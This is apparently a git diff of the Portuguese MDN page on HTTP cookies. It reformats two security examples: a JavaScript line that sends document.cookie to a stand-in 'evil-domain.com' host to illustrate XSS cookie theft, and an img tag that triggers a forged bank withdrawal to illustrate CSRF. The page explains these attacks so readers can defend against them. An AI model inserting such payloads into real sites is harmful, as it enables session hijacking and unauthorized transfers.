@@ -142,7 +142,8 @@ Consulte as questões de segurança na seção [Segurança](/pt-BR/docs/Web/HTTP
 Os cookies geralmente são usados em aplicações web para identificar um usuário e sua sessão autenticada, portanto roubar um cookie pode levar ao sequestro da sessão do usuário autenticado. As formas mais comuns de roubar cookies incluem Engenharia Social ou exploração de uma vulnerabilidade {{Glossary("XSS")}} em uma aplicação.
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 O atributo `HttpOnly` do cookie pode ajudar a minimizar este ataque ao prevenir o acesso ao valor do cookie usando JavaScript.
@@ -152,7 +153,8 @@ O atributo `HttpOnly` do cookie pode ajudar a minimizar este ataque ao prevenir 
 [A Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) menciona um bom exemplo de {{Glossary("CSRF")}}. Nesta situação, alguém inclui uma imagem que não é realmente uma imagem, como por exemplo em um chat ou fórum sem filtro, mas sim uma requisição para o servidor de um banco para sacar dinheiro:
 
 ```html
-<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+<img
+  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
 ```
 
 Agora, se você estiver logado na sua conta no banco e seus cookies ainda são válidos, e não há mais nenhuma validação, você vai transferir o dinheiro assim que carregar o código HTML que contém a imagem. Existem algumas técnicas que são usadas para evitar ataques deste tipo:
